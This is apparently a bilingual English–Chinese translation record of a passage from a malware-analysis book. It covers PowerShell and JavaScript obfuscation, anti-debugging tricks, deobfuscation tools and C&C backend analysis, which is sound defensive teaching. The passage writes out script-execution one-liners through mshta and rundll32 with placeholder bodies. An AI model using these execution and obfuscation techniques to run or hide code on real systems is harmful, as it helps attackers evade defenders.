  zh: 如我们所知，PowerShell 命令是通过 Windows 控制台执行的，因此我们之前描述的几乎所有混淆技术都可以在这里应用。此外，几种其他简单的混淆技巧也证明非常流行：
- en: Multiple string concatenations with either a basic `+` syntax with actual values
    or variables storing them or using the `Join` or `Concat` functions.
  id: totrans-331
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用基本的 `+` 语法进行多重字符串连接，可以是实际值或存储它们的变量，或者使用 `Join` 或 `Concat` 函数。
- en: Multiple excessive single, double, and backquotes.
  id: totrans-332
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 多个过多的单引号、双引号和反引号。
- en: '`split` and `join` usage, as shown here:'
  id: totrans-333
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`split` 和 `join` 的使用，如下所示：'
- en: '[PRE7]'
  id: totrans-334
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE7]'
- en: String reverse (generally, either by reading a reversed string from the end
    or casting it to an array and using `[Array]::Reverse`; it rarely uses regex with
    the `RightToLeft` traverse type). The use of `[Char]<numeric_value>` or `ToInt<int_size>`
    syntaxes instead of the symbols themselves.
  id: totrans-335
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 字符串反转（通常是通过从末尾读取反转的字符串，或将其强制转换为数组并使用 `[Array]::Reverse`；很少使用带有 `RightToLeft`
    遍历类型的正则表达式）。使用 `[Char]<numeric_value>` 或 `ToInt<int_size>` 语法而不是符号本身。
- en: A combination of compression and base64 encoding using the aforementioned methods
    (see *Figure 10.21* for an example).
  id: totrans-336
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用上述方法（参见 *图 10.21* 了解示例）结合压缩和 Base64 编码。
- en: 'In terms of encryption, the following approaches have proved to be popular:'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: 在加密方面，以下方法已被证明非常流行：
- en: The `-bxor` arithmetic operator for simple encryption.
  id: totrans-338
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-bxor` 算术运算符用于简单加密。'
- en: 'The `ConvertTo-SecureString` cmdlet for converting the encrypted block into
    a secure string, which stores information in an encrypted form in memory. It is
    often used with the following code block to access the actual value inside the
    secure string:'
  id: totrans-339
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`ConvertTo-SecureString` cmdlet 用于将加密块转换为安全字符串，它将信息以加密形式存储在内存中。通常与以下代码块一起使用，以访问安全字符串内部的实际值：'
- en: '[PRE8]'
  id: totrans-340
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE8]'
- en: For this cmdlet, the decryption key can be provided in either a `-key` or a
    `-securekey` argument (or perhaps something like `-kE`).
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 对于此 cmdlet，可以通过 `-key` 或 `-securekey` 参数（或类似 `-kE` 的参数）提供解密密钥。
- en: To handle them, you must successfully identify the algorithm that’s being used
    and then reverse the logic using the information available. Writing simple scripts
    using your language of preference is one option, but in many cases, it can only
    be handled using the online **CyberChef** tool.
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 为了处理它们，你必须成功识别正在使用的算法，然后使用可用信息反转逻辑。使用你喜欢的编程语言编写简单脚本是一种选择，但在许多情况下，只能通过在线 **CyberChef**
    工具来处理。
- en: Let’s talk about what other tools we can use to facilitate the analysis.
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们讨论一下我们可以使用哪些其他工具来促进分析。
- en: Static and dynamic analysis
  id: totrans-344
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 静态分析和动态分析
- en: 'PowerShell has a powerful embedded help tool that can be used to get the description
    of any command. It can be obtained by executing a `Get-Help <command_name>` statement:'
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 有一个强大的内嵌帮助工具，可以用来获取任何命令的描述。通过执行 `Get-Help <command_name>` 语句可以获取：
- en: '![Figure 10.22 – Getting a description for a PowerShell command'
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.22 – 获取 PowerShell 命令的描述'
- en: '](img/Figure_10.22_B18500.jpg)'
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.22_B18500.jpg)'
- en: Figure 10.22 – Getting a description for a PowerShell command
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.22 – 获取PowerShell命令的描述
- en: Overall, deobfuscation and decoding operations mainly require only a basic set
    of skills, such as how to decode base64, how to decompress deflate and gzip, how
    to remove meaningless characters, how to replace variables, and how to read partially
    written commands. Any text editor with the corresponding syntax highlight can
    be used for static analysis in this case.
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 总的来说，去混淆和解码操作主要只需要一套基本技能，例如如何解码base64，如何解压deflate和gzip，如何去除无意义的字符，如何替换变量，以及如何读取部分完成的命令。在这种情况下，任何带有相应语法高亮的文本编辑器都可以用于静态分析。
- en: 'While `xor` can be decrypted in multiple ways, the easiest way to handle embedded
    PowerShell encryption is through dynamic analysis in the PowerShell `Set-Content`,
    `Add-Content`, and `Out-File` cmdlets, along with the pipe symbol (`|`) or classic
    `>` and `>>` input redirects, can be used:'
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然`xor`可以通过多种方式解密，但处理嵌入式PowerShell加密的最简单方法是通过PowerShell的动态分析，`Set-Content`、`Add-Content`和`Out-File`
    cmdlet，并且可以使用管道符号（`|`）或经典的`>`和`>>`输入重定向：
- en: '[PRE9]'
  id: totrans-351
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: Alternatively, the `Write-Host` cmdlet can be used to write the decrypted output
    to the console and then redirect it to a file. Finally, a great tool called **PSDecode**
    can be used to quickly try to handle obfuscation automatically (this may involve
    code execution, so use it with care).
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，可以使用`Write-Host` cmdlet将解密后的输出写入控制台，然后重定向到文件。最后，一个名为**PSDecode**的强大工具可以用来快速处理混淆，自动化完成（这可能涉及代码执行，所以请谨慎使用）。
- en: Now, it is time to talk about JavaScript-based threats.
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，到了讨论基于JavaScript的威胁的时刻。
- en: Handling JavaScript
  id: totrans-354
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 处理JavaScript
- en: JavaScript is a web language that powers billions of pages on the internet,
    so it is no surprise that it is commonly used to create exploits that target web
    users. However, on Windows, it is also possible to execute JScript (a very similar
    dialect of ECMAScript) files through Windows Script Host, which also makes it
    a good candidate for malicious attachments and post-compromised scripting. For
    example, a fileless threat called **Poweliks** uses JScript code stored in the
    registry to achieve system persistence without leaving separate files on a disk.
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: JavaScript是一种网页语言，驱动着互联网数十亿的页面，因此它被广泛用于创建针对网络用户的漏洞利用也不足为奇。然而，在Windows上，也可以通过Windows脚本宿主执行JScript（一个与ECMAScript非常相似的方言）文件，这也使其成为恶意附件和后渗透脚本的一个不错的候选项。例如，一种名为**Poweliks**的无文件威胁通过存储在注册表中的JScript代码实现系统持久化，而无需在磁盘上留下独立的文件。
- en: Since there are minor differences between JavaScript and JScript, here, we will
    cover syntax that is common to both of them. Additionally, starting from this
    moment, we will use the JavaScript notation.
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: 由于JavaScript和JScript之间存在一些微小差异，这里我们将介绍它们共同的语法。此外，从现在开始，我们将使用JavaScript符号表示法。
- en: 'The universal file extension for JavaScript files is `.js`; encoded JScript
    files have the `.jse` extension. Additionally, they can be embedded into `.wsf`
    and `.hta` files in the same way as VBScript. In terms of similarity, on Windows,
    both `.js`/`.jse` and `.wsf` files can be executed locally by `wscript.exe` and
    `cscript.exe`. On the other hand, `.hta` files are executed by `mshta.exe`. There
    are several ways to execute inline JavaScript scripts:'
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: JavaScript文件的通用扩展名是`.js`；编码过的JScript文件则有`.jse`扩展名。此外，它们也可以像VBScript一样嵌入到`.wsf`和`.hta`文件中。在相似性方面，在Windows上，`.js`/`.jse`和`.wsf`文件可以通过`wscript.exe`和`cscript.exe`本地执行。另一方面，`.hta`文件则由`mshta.exe`执行。执行内联JavaScript脚本有几种方式：
- en: '`mshta javascript:<script_body>`'
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: '`mshta javascript:<script_body>`'
- en: '`rundll32.exe javascript:"..\mshtml,RunHTMLApplication";<script_body>`'
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: '`rundll32.exe javascript:"..\mshtml,RunHTMLApplication";<script_body>`'
- en: In addition to this, on Windows, it is possible to execute JavaScript code using
    `regsvr32.exe` as a COM scriptlet (`.sct` files). On Linux, multiple options are
    available for executing JavaScript files from the console, such as **phantomjs**,
    and, of course, the JavaScript code can be executed in full-fledged browsers.
    We will cover this in more detail in the *Static and dynamic analysis* section.
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 除此之外，在Windows上，可以使用`regsvr32.exe`作为COM脚本组件（`.sct`文件）执行JavaScript代码。在Linux上，有多种方法可以从控制台执行JavaScript文件，例如**phantomjs**，当然，也可以在完整的浏览器中执行JavaScript代码。我们将在*静态与动态分析*部分详细讨论这一点。
- en: Basic syntax
  id: totrans-361
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 基本语法
- en: 'If the script is going to be executed locally, particular attention should
    be paid to certain types of operations that can answer questions about its purpose,
    persistence mechanism, and communication protocol. In terms of similarity with
    VBScript, on Windows, the same COM objects can be used for this purpose, as described
    previously:'
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 如果脚本将要在本地执行，则应特别注意某些类型的操作，它们可以回答关于脚本目的、持久性机制和通信协议的问题。与 VBScript 的相似性方面，在 Windows
    上，可以使用相同的 COM 对象，如前所述：
- en: '![Figure 10.23 – An example of JavaScript code writing data to a ﬁle on Windows'
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.23 – 一个 JavaScript 代码示例，写入数据到 Windows 上的文件'
- en: '](img/Figure_10.23_B18500.jpg)'
  id: totrans-364
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.23_B18500.jpg)'
- en: Figure 10.23 – An example of JavaScript code writing data to a ﬁle on Windows
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.23 – 一个 JavaScript 代码示例，写入数据到 Windows 上的文件
- en: On Linux, JavaScript is not used to execute commands locally as it requires
    some custom modules, such as node.js, which may not be available on the target
    system.
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: 在Linux上，JavaScript不用于本地执行命令，因为它需要一些自定义模块，如node.js，而这些模块可能在目标系统上不可用。
- en: 'In terms of web applications, the following functions need to be paid attention
    to:'
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Web 应用程序中，以下函数需要注意：
- en: '**Code execution**:'
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: '**代码执行**：'
- en: '`eval`: Execute a script block provided as an argument'
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: '`eval`: 执行作为参数提供的脚本块'
- en: '**Page redirects**:'
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: '**页面重定向**：'
- en: 'There are multiple options here, as shown in the following code block:'
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: 这里有多种选项，如下方代码块所示：
- en: window.location = '<new_url>';
  id: totrans-372
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: window.location = '<new_url>';
- en: window.location.href = '<new_url>';
  id: totrans-373
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: window.location.href = '<new_url>';
- en: window.location.assign('<new_url>');
  id: totrans-374
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: window.location.assign('<new_url>');
- en: window.location.replace('<new_url>'); // overwrites current page in the browser
    history
  id: totrans-375
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: window.location.replace('<new_url>'); // 替换浏览器历史中的当前页面
- en: Important note
  id: totrans-376
  prefs: []
  type: TYPE_NORMAL
  zh: 重要提示
- en: The `window.` part can commonly be omitted.
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
  zh: '`window.` 部分通常可以省略。'
- en: self.location = '<new_url>';
  id: totrans-378
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: self.location = '<new_url>';
- en: top.location = '<new_url>';
  id: totrans-379
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: top.location = '<new_url>';
- en: document.location = '<new_url>';
  id: totrans-380
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: document.location = '<new_url>';
- en: Important note
  id: totrans-381
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 重要提示
- en: There are also possible derivatives for them, similar to the window.location-based
    techniques mentioned previously.
  id: totrans-382
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 它们也有可能的衍生技术，类似于前面提到的基于 window.location 的技术。
- en: 'Apart from that, there is also another way to redirect the user without using
    JavaScript:'
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: 除此之外，还有另一种不使用 JavaScript 的方式来重定向用户：
- en: <meta http-equiv="refresh" content="<num_of_seconds>; url=<new_url>">;
  id: totrans-384
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: <meta http-equiv="refresh" content="<num_of_seconds>; url=<new_url>">;
- en: '**External script loading**:'
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: '**外部脚本加载**：'
- en: <script src="img/<name>.js">
  id: totrans-386
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: <script src="img/<name>.js">
- en: var script = document.createElement('script'); script.src = <something>;
  id: totrans-387
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: var script = document.createElement('script'); script.src = <something>;
- en: '**Web requests to remote machines**:'
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
  zh: '**Web 请求到远程机器**：'
- en: 'The `XMLHttpRequest` object:'
  id: totrans-389
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`XMLHttpRequest` 对象：'
- en: '`open`: A method to create a request'
  id: totrans-390
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`open`: 用于创建请求的方法'
- en: '`send`: A method to send a request'
  id: totrans-391
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`send`: 发送请求的方法'
- en: '`responseText`: A property to access the server response'
  id: totrans-392
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`responseText`: 用于访问服务器响应的属性'
- en: '`fetch`: A relatively new way to send and process HTTP requests that was standardized
    in ES6.'
  id: totrans-393
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`fetch`: 一种较新的发送和处理 HTTP 请求的方式，在 ES6 中被标准化。'
- en: Popular libraries such as jQuery and custom implementations of asynchronous
    JavaScript and XML (Ajax) usually utilize `XMLHttpRequest` and sometimes `fetch`
    requests on the backend.
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
  zh: 流行的库，如 jQuery 和自定义的异步 JavaScript 与 XML（Ajax）实现，通常在后台使用 `XMLHttpRequest` 和有时的
    `fetch` 请求。
- en: Anti-reverse engineering tricks
  id: totrans-395
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 反逆向工程技巧
- en: 'The most common JavaScript obfuscation technique that’s employed with some
    variations is dynamically building the next layer of JavaScript code by either
    decrypting it or assembling it from integers with the subsequent execution using
    the `eval` function or updating the document using `document.write`:'
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
  zh: 最常见的 JavaScript 混淆技术是使用一些变种，通过解密或从整数中组合来动态构建下一层 JavaScript 代码，随后使用 `eval` 函数执行或通过
    `document.write` 更新文档：
- en: '![Figure 10.24 – Obfuscated JavaScript-based threat'
  id: totrans-397
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.24 – 混淆的基于 JavaScript 的威胁'
- en: '](img/Figure_10.24_B18500.jpg)'
  id: totrans-398
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.24_B18500.jpg)'
- en: Figure 10.24 – Obfuscated JavaScript-based threat
  id: totrans-399
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.24 – 混淆的基于 JavaScript 的威胁
- en: 'However, several other techniques are widely used by malware authors:'
  id: totrans-400
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，许多恶意软件作者广泛使用了其他一些技术：
- en: '**Storing the block required for successful decryption in a separate block
    or file**: In this case, obtaining only the decryption function may not be enough
    as it relies on some other piece of data being stored externally.'
  id: totrans-401
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**将成功解密所需的块存储在单独的块或文件中**：在这种情况下，仅获取解密函数可能不足，因为它依赖于某些其他数据片段的外部存储。'
- en: '`performance.now()` or `date.now()` functions are used.'
  id: totrans-402
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`performance.now()` 或 `date.now()` 函数被使用。'
- en: '`arguments.callee` property.'
  id: totrans-403
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`arguments.callee` 属性。'
- en: '`console.log` function:'
  id: totrans-404
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`console.log` 函数：'
- en: '[PRE10]'
  id: totrans-405
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE10]'
- en: 'Alternatively, it is possible to redefine the function as follows:'
  id: totrans-406
  prefs: []
  type: TYPE_NORMAL
  zh: 另外，也可以按如下方式重新定义该函数：
- en: '[PRE11]'
  id: totrans-407
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: '**Detecting developer tools**: There are multiple ways this can be implemented,
    such as by checking Windows’ inner and outer sizes.'
  id: totrans-408
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**检测开发者工具**：实现这一功能的方法有很多种，例如通过检查 Windows 的内外尺寸。'
- en: There are other techniques as well, but these are used in malware most often.
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: 还有其他技术，但这些在恶意软件中使用得最为频繁。
- en: Static and dynamic analysis
  id: totrans-410
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 静态与动态分析
- en: With web development on the rise, there are plenty of tools that exist for analyzing
    and debugging JavaScript code – from basic text editors with syntax highlights
    to quite sophisticated packages. However, the developer’s use cases are quite
    different from the reverse engineer’s, which eventually determines which set of
    programs are used by them.
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: 随着网页开发的兴起，已经有许多工具可以用来分析和调试 JavaScript 代码——从带有语法高亮的基本文本编辑器到相当复杂的套件。然而，开发者的使用场景与逆向工程师的使用场景截然不同，这最终决定了他们使用的程序集合。
- en: First of all, to speed up the analysis, it makes sense to reformat the existing
    JavaScript code so that it is easier to follow the logic. Multiple tools serve
    this purpose and they contain basic unpacking and deobfuscation logic, such as
    **jsbeautifier**.
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，为了加快分析速度，重构现有的 JavaScript 代码，使其逻辑更易于跟踪是非常有意义的。许多工具可以实现这一目标，它们包含基本的解包和去混淆逻辑，例如**jsbeautifier**。
- en: In terms of generic dynamic analysis, embedded browser toolsets such as **Chrome
    Developer Tools** and **Firefox Developer Tools** are extremely handy. To use
    them, a small HTML block needs to be written to load the JavaScript file of interest.
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
  zh: 就通用动态分析而言，像**Chrome 开发者工具**和**Firefox 开发者工具**这样的嵌入式浏览器工具集非常方便。使用它们时，需要编写一个小的
    HTML 块来加载感兴趣的 JavaScript 文件。
- en: 'Here, the JavaScript code is embedded into the page itself:'
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，JavaScript 代码被嵌入到页面本身：
- en: '![Figure 10.25 – An example of the embedded JavaScript code in Chrome Developer
    Tools'
  id: totrans-415
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.25 – Chrome 开发者工具中嵌入式 JavaScript 代码的示例'
- en: '](img/Figure_10.25_B18500.jpg)'
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.25_B18500.jpg)'
- en: Figure 10.25 – An example of the embedded JavaScript code in Chrome Developer
    Tools
  id: totrans-417
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.25 – Chrome 开发者工具中嵌入式 JavaScript 代码的示例
- en: 'Here is the externally loaded JavaScript script in Firefox:'
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
  zh: 这是 Firefox 中外部加载的 JavaScript 脚本：
- en: '![Figure 10.26 – An example of the external JavaScript script in Firefox Developer
    Tools'
  id: totrans-419
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.26 – Firefox 开发者工具中外部 JavaScript 脚本的示例'
- en: '](img/Figure_10.26_B18500.jpg)'
  id: totrans-420
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.26_B18500.jpg)'
- en: Figure 10.26 – An example of the external JavaScript script in Firefox Developer
    Tools
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.26 – Firefox 开发者工具中外部 JavaScript 脚本的示例
- en: In addition to this, several customized tools implement the functionality required
    for malware analysis. One of them is **Malzilla**; this free toolset combines
    multiple smaller tools that aim to make analysis easier by implementing the most
    common operations required. While relatively old, it is still used by many malware
    analysts to quickly go through obfuscation layers and extract the actual functionality.
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，还有一些定制工具实现了恶意软件分析所需的功能。其中之一是**Malzilla**；这个免费的工具集结合了多个小工具，通过实现最常见的操作，旨在简化分析过程。虽然相对较旧，但仍被许多恶意软件分析师用来快速穿透混淆层并提取实际功能。
- en: 'The most commonly used functionality of Malzilla is the module that can intercept
    the `eval` call and output its argument to the screen. This is an extremely useful
    feature as most obfuscation techniques build up the actual payload before executing
    it using this function. This means that this is the point where the decrypted
    or deobfuscated logic becomes available, sometimes after a few iterations. It
    also includes various smart decoders that drastically speed up the analysis:'
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
  zh: Malzilla 最常用的功能是可以拦截`eval`调用并将其参数输出到屏幕的模块。这个功能非常有用，因为大多数混淆技术都会在执行之前，通过此功能构建实际的有效载荷。这意味着这是解密或去混淆后的逻辑变得可用的地方，有时需要几次迭代。它还包括各种智能解码器，极大地加速了分析过程：
- en: '![Figure 10.27 – Malzilla decoders'
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.27 – Malzilla 解码器'
- en: '](img/Figure_10.27_B18500.jpg)'
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.27_B18500.jpg)'
- en: Figure 10.27 – Malzilla decoders
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.27 – Malzilla 解码器
- en: 'Another example of such a tool is the more recent **JSDetox** project. It aims
    to facilitate static analysis and handle JavaScript obfuscation techniques. Unlike
    Malzilla, it is more focused on the Linux environment:'
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个这样的工具的例子是较新的**JSDetox**项目。它旨在促进静态分析并处理 JavaScript 混淆技术。与 Malzilla 不同，它更侧重于
    Linux 环境：
- en: '![Figure 10.28 – The JSDetox website describing its functionality'
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.28 – 描述其功能的JSDetox网站'
- en: '](img/Figure_10.28_B18500.jpg)'
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
  zh: '](img/Figure_10.28_B18500.jpg)'
- en: Figure 10.28 – The JSDetox website describing its functionality
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.28 – 描述其功能的JSDetox网站
- en: Now, let’s talk about the backend code.
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们来谈谈后台代码。
- en: Behind C&C – even malware has its own backend
  id: totrans-432
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: C&C背后——即使是恶意软件也有自己的后台
- en: Many malware families use some sort of C&C server to receive updates or custom
    commands from the malicious actor or to exfiltrate stolen data. Getting access
    to these backend files can give researchers and law enforcement agencies a lot
    of information about how malware works and who the victims are. Sometimes, it
    can even lead to the actual people behind the attack! Therefore, properly and
    promptly analyzing the code obtained from the C&C is an important task that researchers
    have to face from time to time, so it’s better to be ready!
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: 许多恶意软件家族使用某种形式的C&C服务器来接收来自恶意攻击者的更新或自定义命令，或者将被窃取的数据外泄。访问这些后台文件可以为研究人员和执法机构提供大量关于恶意软件如何运作以及受害者是谁的信息。有时，这甚至可以追溯到真正的攻击者！因此，正确且及时地分析从C&C获取的代码是一项研究人员必须时常面对的重要任务，所以最好做好准备！
- en: Things to focus on
  id: totrans-434
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 需要关注的事项
- en: 'So long as the analyst has access to the code, it makes sense to prepare and
    prioritize a list of questions to answer. Generally, the following knowledge can
    be obtained from the backend:'
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: 只要分析员能访问代码，制定并优先处理待解答问题的清单是有意义的。通常，从后台可以获得以下信息：
- en: Is it an actual backend code or a proxy redirecting messages to another location?
    What URI or port does the malware utilize?
  id: totrans-436
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它是实际的后台代码，还是一个将消息重定向到另一个位置的代理？恶意软件使用了什么URI或端口？
- en: What is the format of the accepted requests or messages and is there any encryption
    involved?
  id: totrans-437
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 接受的请求或消息的格式是什么，是否涉及加密？
- en: Are there any commands that it can return to the malware, either automatically
    or on demand?
  id: totrans-438
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否有任何命令可以自动或按需返回给恶意软件？
- en: Can it issue self-destruction commands and is there any form of authentication
    for them?
  id: totrans-439
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 它是否能发出自毁命令，并且是否有任何形式的认证？
- en: Is there a web interface or dashboard available for the attacker?
  id: totrans-440
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否有供攻击者使用的网页接口或仪表盘？
- en: What are the locations for the logs, the additional payloads delivered, and
    the stolen data?
  id: totrans-441
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 日志、额外载荷和被窃取数据的存放位置在哪里？
- en: Are there any statistics about affected users available?
  id: totrans-442
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否有关于受影响用户的统计数据可用？
- en: Are there any logs that will reveal the malware writer’s identity? The SSH or
    RDP/custom RAT logs may help answer this question.
  id: totrans-443
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 是否有任何日志能够揭示恶意软件作者的身份？SSH或RDP/自定义RAT日志可能有助于回答这个问题。
- en: More advanced steps include searching for communication patterns that may help
    identify future C&Cs. If the HTTPS protocol was used, it may make sense to check
    where the corresponding certificate came from.
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 更高级的步骤包括寻找可能有助于识别未来C&C的通信模式。如果使用了HTTPS协议，检查相应证书的来源可能会有意义。
- en: Static and dynamic analysis
  id: totrans-445
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 静态和动态分析
- en: Multiple programming languages can be used to implement a backend. Whether it
    is PHP, Perl, Python, or something else, you need to correctly identify the programming
    language and check whether it is a ready framework. The first part of this task
    can be solved by looking at the corresponding file extensions. For the second
    part, the configuration files or directories will usually contain the name of
    the framework used.
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用多种编程语言来实现后台。不管是PHP、Perl、Python还是其他语言，你都需要正确识别编程语言，并检查它是否是一个现成的框架。这个任务的第一部分可以通过查看相应的文件扩展名来解决。第二部分通常可以通过配置文件或目录来找到所使用的框架名称。
- en: Installing the corresponding IDE and loading the project there will drastically
    speed up further analysis as it will facilitate efficient static and dynamic analysis.
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
  zh: 安装相应的IDE并在其中加载项目将大大加速进一步的分析，因为这将有助于高效的静态和动态分析。
- en: Other script languages
  id: totrans-448
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 其他脚本语言
- en: In this chapter, we covered the most common examples of languages used nowadays.
    But what if you encounter something more exotic that you don’t have a ready step-by-step
    tutorial for? Or what if a new script language becomes increasingly popular, is
    available on lots of systems, and is, therefore, misused by malicious actors?
    Don’t panic – we have summarized the ideas that will help you successfully analyze
    any new threat.
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: 本章介绍了当今使用最广泛的编程语言的常见示例。但如果你遇到一些更为特殊的语言，且没有现成的逐步教程该如何处理呢？或者，如果某种新的脚本语言变得越来越流行，广泛应用于各类系统，并因此被恶意行为者滥用该怎么办？不用慌张——我们已经总结了一些思路，帮助你成功分析任何新的威胁。
- en: Where to start
  id: totrans-450
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 从哪里开始
- en: 'Here is what you should do when analyzing a new threat:'
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析新威胁时，您应该执行以下操作：
- en: 'Identify the language. There are multiple ways to do this, as follows:'
  id: totrans-452
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确定编程语言。可以通过多种方式来完成，具体如下：
- en: Look at the file extensions used
  id: totrans-453
  prefs:
  - PREF_IND
